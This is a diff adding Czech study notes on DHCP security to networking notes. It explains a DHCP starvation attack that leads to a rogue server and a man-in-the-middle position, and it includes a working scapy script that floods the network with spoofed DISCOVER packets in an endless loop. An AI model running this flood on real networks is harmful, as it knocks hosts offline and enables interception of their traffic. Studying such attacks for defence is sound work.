@@ -58,3 +58,29 @@ SW#show ip dhcp server statistics                         // statistiky serveru
 ```
 
 #### DHCP security
+- Pro síť je špatně nastavené DHCP hrozba.
+
+#### Startvation attack
+- Útočník zahlcuje tabulku pro volne hosty pomocí scriptu. Poté můžu začít hostovat vlastní DHCP server, jelikož původní bude plný noví hostové budou dostávat adresu od útočníkovo DHCP serveru. Jelikož DHCP přiřazuje i gateway tak útočník zde může dát svoji IP adresu a jednoduše získat Man in the Middle útok.
+
+Python script: 
+- pozor jaký interface používáte
+```
+#!/usr/bin/python3
+from scapy.all import *
+
+conf.checkIPaddr = False  #Disable IP address checking
+
+#Building DISCOVER packet
+#Making an Ethernet packet
+DHCP_DISCOVER = Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC(), type=0x0800) \
+            / IP(src='0.0.0.0', dst='255.255.255.255') \
+            / UDP(dport=67,sport=68) \
+            / BOOTP(op=1, chaddr=RandMAC()) \
+            / DHCP(options=[('message-type','discover'), ('end')])
+
+#Sending the crafted packet in a loop using the "eth0" interface
+sendp(DHCP_DISCOVER, iface='eth0',loop=1,verbose=1 )-
+```
+
+Pro hostování DHCP serveru = https://udhcp.busybox.net/
